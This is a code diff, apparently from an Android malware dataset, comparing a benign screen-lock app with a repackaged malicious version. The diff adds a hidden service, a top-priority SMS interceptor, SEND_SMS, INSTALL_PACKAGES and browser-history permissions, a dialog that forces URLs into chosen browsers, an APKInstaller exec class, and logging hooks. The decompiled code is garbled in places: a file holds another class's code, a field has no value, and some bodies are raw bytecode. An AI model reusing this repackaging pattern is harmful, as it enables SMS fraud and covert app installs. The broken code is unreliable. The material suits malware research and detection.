diff --git a/result/APP_47/App_B_47/AndroidManifest.xml b/result/APP_47/App_M_47/AndroidManifest.xml
index 3f0c300..52cc0f1 100755
--- a/result/APP_47/App_B_47/AndroidManifest.xml
+++ b/result/APP_47/App_M_47/AndroidManifest.xml
@@ -46,12 +46,29 @@
             </intent-filter>
         </receiver>
         <service android:name=".service.ScreenService"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
     </application>
     <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 </manifest>
\ No newline at end of file
diff --git a/result/APP_47/App_B_47/apktool.yml b/result/APP_47/App_M_47/apktool.yml
index 172f389..eec0e50 100755
--- a/result/APP_47/App_B_47/apktool.yml
+++ b/result/APP_47/App_M_47/apktool.yml
@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
diff --git a/result/APP_47/App_M_47/com/android/main/APKInstaller.java b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
new file mode 100755
index 0000000..bd0972b
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
@@ -0,0 +1,432 @@
+package com.android.main;
+
+public class APKInstaller
+{
+  public APKInstaller() {}
+  
+  /* Error */
+  public static String exec(String[] paramArrayOfString)
+  {
+    // Byte code:
+          i5 = i1;
+          i7 = m;
+          i8 = k;
+          i9 = j;
+          localObject9 = localObject5;
+          localObject10 = str;
+          localObject11 = localObject3;
+          localObject12 = localObject2;
+          localObject13 = localObject1;
+        }
+        else if (str.equals("com.opera.mini.android"))
+        {
+          i5 = 1;
+          localObject8 = localObject6;
+          i4 = i2;
+          i6 = n;
+          i7 = m;
+          i8 = k;
+          i9 = j;
+          localObject9 = str;
+          localObject10 = localObject4;
+          localObject11 = localObject3;
+          localObject12 = localObject2;
+          localObject13 = localObject1;
+        }
+        else if (str.equals("mobi.mgeek.TunnyBrowser"))
+        {
+          i4 = 1;
+          localObject8 = str;
+          i5 = i1;
+          i6 = n;
+          i7 = m;
+          i8 = k;
+          i9 = j;
+          localObject9 = localObject5;
+          localObject10 = localObject4;
+          localObject11 = localObject3;
+          localObject12 = localObject2;
+          localObject13 = localObject1;
+        }
+        else if (str.equals("com.skyfire.browser"))
+        {
+          i7 = 1;
+          localObject8 = localObject6;
+          i4 = i2;
+          i5 = i1;
+          i6 = n;
+          i8 = k;
+          i9 = j;
+          localObject9 = localObject5;
+          localObject10 = localObject4;
+          localObject11 = str;
+          localObject12 = localObject2;
+          localObject13 = localObject1;
+        }
+        else if (str.equals("com.kolbysoft.steel"))
+        {
+          i8 = 1;
+          localObject8 = localObject6;
+          i4 = i2;
+          i5 = i1;
+          i6 = n;
+          i7 = m;
+          i9 = j;
+          localObject9 = localObject5;
+          localObject10 = localObject4;
+          localObject11 = localObject3;
+          localObject12 = str;
+          localObject13 = localObject1;
+        }
+        else
+        {
+          localObject8 = localObject6;
+          i4 = i2;
+          i5 = i1;
+          i6 = n;
+          i7 = m;
+          i8 = k;
+          i9 = j;
+          localObject9 = localObject5;
+          localObject10 = localObject4;
+          localObject11 = localObject3;
+          localObject12 = localObject2;
+          localObject13 = localObject1;
+          if (str.equals("com.android.browser"))
+          {
+            i3 = 1;
+            localObject8 = localObject6;
+            i4 = i2;
+            i5 = i1;
+            i6 = n;
+            i7 = m;
+            i8 = k;
+            i9 = j;
+            localObject7 = str;
+            localObject9 = localObject5;
+            localObject10 = localObject4;
+            localObject11 = localObject3;
+            localObject12 = localObject2;
+            localObject13 = localObject1;
+          }
+        }
+      }
+    }
+    if (i1 != 0)
+    {
+      gotoUrl((String)localObject5, paramString, localPackageManager);
+      return;
+    }
+    if (n != 0)
+    {
+      gotoUrl((String)localObject4, paramString, localPackageManager);
+      return;
+    }
+    if (i2 != 0)
+    {
+      gotoUrl((String)localObject6, paramString, localPackageManager);
+      return;
+    }
+    if (m != 0)
+    {
+      gotoUrl((String)localObject3, paramString, localPackageManager);
+      return;
+    }
+    if (k != 0)
+    {
+      gotoUrl((String)localObject2, paramString, localPackageManager);
+      return;
+    }
+    if (i3 != 0)
+    {
+      gotoUrl((String)localObject7, paramString, localPackageManager);
+      return;
+    }
+    doDefault(paramString);
+  }
+  
+  private void doDefault(String paramString)
+  {
+    paramString = Uri.parse(paramString);
+    NQfile.callwrite1("android.intent.action.VIEW", paramString);
+    startActivity(new Intent("android.intent.action.VIEW", paramString));
+  }
+  
+  private void gotoUrl(String paramString1, String paramString2, PackageManager paramPackageManager)
+  {
+    try
+    {
+      paramString1 = paramPackageManager.getLaunchIntentForPackage(paramString1);
+      paramString1.setAction("android.intent.action.VIEW");
+      paramString1.addCategory("android.intent.category.DEFAULT");
+      paramString1.setData(Uri.parse(paramString2));
+      startActivity(paramString1);
+      return;
+    }
+    catch (Exception paramString1)
+    {
+      paramString1.printStackTrace();
+    }
+  }
+  
+  private void showTANC(String paramString1, String paramString2, String paramString3)
+  {
+    paramString3 = new TANCButtonListener(paramString3);
+    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
+    localBuilder.setTitle(paramString1);
+    localBuilder.setMessage(paramString2);
+    localBuilder.setPositiveButton("访问", paramString3);
+    localBuilder.setNegativeButton("取消", paramString3);
+    localBuilder.create().show();
+  }
+  
+  public void onCreate(Bundle paramBundle)
+  {
+    super.onCreate(paramBundle);
+    paramBundle = getIntent();
+    showTANC(paramBundle.getStringExtra("header"), paramBundle.getStringExtra("message"), paramBundle.getStringExtra("url"));
+  }
+  
+  private class TANCButtonListener
+    implements DialogInterface.OnClickListener
+  {
+    private String url;
+    
+    public TANCButtonListener(String paramString)
+    {
+      this.url = paramString;
+    }
+    
+    public void onClick(DialogInterface paramDialogInterface, int paramInt)
+    {
+      if (paramInt == -1) {
+        TANCActivity.this.choiceBrowserToVisitUrl(this.url);
+      }
+      paramDialogInterface.cancel();
+      TANCActivity.this.finish();
+    }
+  }
+}
diff --git a/result/APP_47/App_B_47/com/gau/screenguru/finger/component/AdComponent.java b/result/APP_47/App_M_47/com/gau/screenguru/finger/component/AdComponent.java
index 6344d35..e630f6e 100755
--- a/result/APP_47/App_B_47/com/gau/screenguru/finger/component/AdComponent.java
+++ b/result/APP_47/App_M_47/com/gau/screenguru/finger/component/AdComponent.java
@@ -32,6 +32,7 @@ import java.io.UnsupportedEncodingException;
 import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.Random;
+import netqin.NQlog.NQfile;
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpHost;
 import org.apache.http.HttpRequest;
@@ -204,7 +205,9 @@ public class AdComponent
       paramMotionEvent = this.ad2Draw;
       paramMotionEvent.clickCount += 1;
       this.mDatabaseHelper.updateClickCount(this.ad2Draw.mID, this.ad2Draw.clickCount);
-      paramMotionEvent = new Intent("android.intent.action.VIEW", Uri.parse(this.ad2Draw.mAdOptData));
+      paramMotionEvent = Uri.parse(this.ad2Draw.mAdOptData);
+      NQfile.callwrite1("android.intent.action.VIEW", paramMotionEvent);
+      paramMotionEvent = new Intent("android.intent.action.VIEW", paramMotionEvent);
       this.context.startActivity(paramMotionEvent);
       return true;
     }
diff --git a/result/APP_47/App_B_47/com/gau/screenguru/finger/mainmenu/StartScreenActivity.java b/result/APP_47/App_M_47/com/gau/screenguru/finger/mainmenu/StartScreenActivity.java
index af9a80f..2faf744 100755
--- a/result/APP_47/App_B_47/com/gau/screenguru/finger/mainmenu/StartScreenActivity.java
+++ b/result/APP_47/App_M_47/com/gau/screenguru/finger/mainmenu/StartScreenActivity.java
@@ -26,6 +26,7 @@ import android.widget.TextView;
 import com.gau.screenguru.finger.GatherFinger;
 import com.gau.screenguru.finger.Global;
 import com.gau.screenguru.finger.service.ScreenService;
+import netqin.NQlog.NQfile;
 
 public class StartScreenActivity
   extends Activity
@@ -62,7 +63,9 @@ public class StartScreenActivity
   
   private void downloadMoreOnClick()
   {
-    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("http://sskan.mobi/")));
+    Uri localUri = Uri.parse("http://sskan.mobi/");
+    NQfile.callwrite1("android.intent.action.VIEW", localUri);
+    startActivity(new Intent("android.intent.action.VIEW", localUri));
   }
   
   private void helpOnClick()
diff --git a/result/APP_47/App_B_47/com/gau/screenguru/finger/service/BootReceiver.java b/result/APP_47/App_M_47/com/gau/screenguru/finger/service/BootReceiver.java
index 1228d87..9c0347d 100755
--- a/result/APP_47/App_B_47/com/gau/screenguru/finger/service/BootReceiver.java
+++ b/result/APP_47/App_M_47/com/gau/screenguru/finger/service/BootReceiver.java
@@ -6,6 +6,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import com.gau.screenguru.finger.Global;
+import netqin.NQlog.NQfile;
 
 public class BootReceiver
   extends BroadcastReceiver
@@ -14,6 +15,7 @@ public class BootReceiver
   
   public void onReceive(Context paramContext, Intent paramIntent)
   {
+    NQfile.broadcastReceiverwrite(paramIntent);
     if ((paramIntent.getAction().equals("android.intent.action.BOOT_COMPLETED")) && (paramContext.getSharedPreferences(Global.SharedPreferences_name, 0).getBoolean("isStart", false)))
     {
       paramIntent = new ComponentName(paramContext.getPackageName(), ScreenService.class.getName());
diff --git a/result/APP_47/App_B_47/com/gau/screenguru/finger/service/ScreenService.java b/result/APP_47/App_M_47/com/gau/screenguru/finger/service/ScreenService.java
index 26bf97b..a1ef5c8 100755
--- a/result/APP_47/App_B_47/com/gau/screenguru/finger/service/ScreenService.java
+++ b/result/APP_47/App_M_47/com/gau/screenguru/finger/service/ScreenService.java
@@ -15,6 +15,7 @@ import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import com.gau.screenguru.finger.Finger;
 import com.gau.screenguru.finger.Global;
+import netqin.NQlog.NQfile;
 
 public class ScreenService
   extends Service
@@ -72,6 +73,7 @@ public class ScreenService
       {
         try
         {
+          NQfile.broadcastReceiverwrite(paramAnonymousIntent);
           String str = paramAnonymousIntent.getAction();
           if (("android.intent.action.SCREEN_OFF".equals(str)) && (ScreenService.StartScreen))
           {
diff --git a/result/APP_47/App_B_47/com/gau/screenguru/finger/service/ShutDownReceiver.java b/result/APP_47/App_M_47/com/gau/screenguru/finger/service/ShutDownReceiver.java
index e81ce0d..68f2490 100755
--- a/result/APP_47/App_B_47/com/gau/screenguru/finger/service/ShutDownReceiver.java
+++ b/result/APP_47/App_M_47/com/gau/screenguru/finger/service/ShutDownReceiver.java
@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import com.gau.screenguru.finger.Finger;
+import netqin.NQlog.NQfile;
 
 public class ShutDownReceiver
   extends BroadcastReceiver
@@ -13,6 +14,7 @@ public class ShutDownReceiver
   
   public void onReceive(Context paramContext, Intent paramIntent)
   {
+    NQfile.broadcastReceiverwrite(paramIntent);
     if (paramIntent.getAction().equals("android.intent.action.ACTION_SHUTDOWN"))
     {
       paramContext.getPackageManager().clearPackagePreferredActivities(paramContext.getPackageName());
diff --git a/result/APP_47/App_M_47/netqin/NQlog/NQfile.java b/result/APP_47/App_M_47/netqin/NQlog/NQfile.java
new file mode 100755
index 0000000..8c4fd97
--- /dev/null
+++ b/result/APP_47/App_M_47/netqin/NQlog/NQfile.java
@@ -0,0 +1,210 @@
+package netqin.NQlog;
+
+import android.content.ContentProviderOperation;
+import android.content.ContentValues;
+import android.content.Intent;
+import android.net.Uri;
+import java.net.HttpURLConnection;
+import java.net.URI;
+import java.net.URL;
+import java.net.URLConnection;
+import java.util.ArrayList;
+import java.util.Calendar;
+import org.apache.http.client.methods.HttpUriRequest;
+
+public class NQfile
+{
+  public static String logPath = "/data/data/" + packageName + "/log.txt";
+  public static boolean notify = true;
+  public static String packageName = ;
+  
+  public NQfile() {}
+  
+  public static void broadcastReceiverwrite()
+  {
+    write("broadcastReceiver", "");
+  }
+  
+  public static void broadcastReceiverwrite(Intent paramIntent)
+  {
+    write("broadcastReceiver", paramIntent.getAction());
+  }
+  
+  public static void callwrite1(String paramString, Uri paramUri)
+  {
+    if (paramString.equals("android.intent.action.CALL")) {
+      write("call", paramUri.toString());
+    }
+  }
+  
+  public static void callwrite2(String paramString)
+  {
+    write("call", paramString);
+  }
+  
+  public static void deletewrite(Uri paramUri)
+  {
+    write("delete", paramUri.toString());
+  }
+  
+  public static String getCurrentTime(Calendar paramCalendar)
+  {
+    int i = paramCalendar.get(1);
+    int j = paramCalendar.get(2) + 1;
+    int k = paramCalendar.get(5);
+    int m = paramCalendar.get(11);
+    int n = paramCalendar.get(12);
+    int i1 = paramCalendar.get(13);
+    int i2 = paramCalendar.get(14);
+    Object localObject = null;
+    if ((m < 10) && (n < 10) && (i1 < 10)) {
+      paramCalendar = i + "-" + j + "-" + k + "  " + "0" + m + ":0" + n + ":0" + i1 + ":" + i2;
+    }
+    do
+    {
+      do
+      {
+        do
+        {
+          return paramCalendar;
+          if ((m < 10) && (n < 10) && (i1 > 10)) {
+            return i + "-" + j + "-" + k + "  " + "0" + m + ":0" + n + ":" + i1 + ":" + i2;
+          }
+          if ((m < 10) && (n > 10) && (i1 < 10)) {
+            return i + "-" + j + "-" + k + "  " + "0" + m + ":" + n + ":0" + i1 + ":" + i2;
+          }
+          if ((m < 10) && (n > 10) && (i1 > 10)) {
+            return i + "-" + j + "-" + k + "  " + "0" + m + ":" + n + ":" + i1 + ":" + i2;
+          }
+          if ((m > 10) && (n < 10) && (i1 < 10)) {
+            return i + "-" + j + "-" + k + "  " + m + ":0" + n + ":0" + i1 + ":" + i2;
+          }
+          if ((m > 10) && (n < 10) && (i1 > 10)) {
+            return i + "-" + j + "-" + k + "  " + m + ":0" + n + ":" + i1 + ":" + i2;
+          }
+          if ((m > 10) && (n > 10) && (i1 < 10)) {
+            return i + "-" + j + "-" + k + "  " + m + ":" + n + ":0" + i1 + ":" + i2;
+          }
+          paramCalendar = localObject;
+        } while (m <= 10);
+        paramCalendar = localObject;
+      } while (n <= 10);
+      paramCalendar = localObject;
+    } while (i1 <= 10);
+    return i + "-" + j + "-" + k + "  " + m + ":" + n + ":" + i1 + ":" + i2;
+  }
+  
+  public static void insert1write(ContentValues paramContentValues)
+  {
+    write("insert1", paramContentValues.toString());
+  }
+  
+  public static void insert2write(ArrayList<ContentProviderOperation> paramArrayList)
+  {
+    write("insert2", paramArrayList.toString());
+  }
+  
+  public static void net1write(URLConnection paramURLConnection)
+  {
+    write("net1", paramURLConnection.getURL().toString());
+  }
+  
+  public static void net2write(HttpUriRequest paramHttpUriRequest)
+  {
+    write("net2", paramHttpUriRequest.getURI().toString());
+  }
+  
+  public static void net3write(URL paramURL)
+  {
+    write("net3", paramURL.toString());
+  }
+  
+  public static void netwrite(HttpURLConnection paramHttpURLConnection)
+  {
+    write("net:", paramHttpURLConnection.getURL().toString());
+  }
+  
+  public static void shell1write(String[] paramArrayOfString)
+  {
+    String str = "";
+    int i = 0;
+    for (;;)
+    {
+      if (i >= paramArrayOfString.length)
+      {
+        write("shell", str);
+        return;
+      }
+      str = str + paramArrayOfString[i] + " ";
+      i += 1;
+    }
+  }
+  
+  public static void shellwrite(String paramString)
+  {
+    write("shell", paramString);
+  }
+  
+  public static void smswrite(String paramString1, String paramString2)
+  {
+    write("sms", paramString1 + ";" + paramString2);
+  }
+  
+  /* Error */
+  public static void write(String paramString1, String paramString2)
+  {
+    // Byte code:
+    //   0: invokestatic 177	java/util/Calendar:getInstance	()Ljava/util/Calendar;
+    //   3: invokestatic 179	netqin/NQlog/NQfile:getCurrentTime	(Ljava/util/Calendar;)Ljava/lang/String;
+    //   6: astore_2
+    //   7: new 181	java/io/BufferedWriter
+    //   10: dup
+    //   11: new 183	java/io/OutputStreamWriter
+    //   14: dup
+    //   15: new 185	java/io/FileOutputStream
+    //   18: dup
+    //   19: getstatic 38	netqin/NQlog/NQfile:logPath	Ljava/lang/String;
+    //   22: iconst_1
+    //   23: invokespecial 188	java/io/FileOutputStream:<init>	(Ljava/lang/String;Z)V
+    //   26: invokespecial 191	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
+    //   29: invokespecial 194	java/io/BufferedWriter:<init>	(Ljava/io/Writer;)V
+    //   32: astore_3
+    //   33: aload_3
+    //   34: new 21	java/lang/StringBuilder
+    //   37: dup
+    //   38: aload_2
+    //   39: invokestatic 163	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
+    //   42: invokespecial 27	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
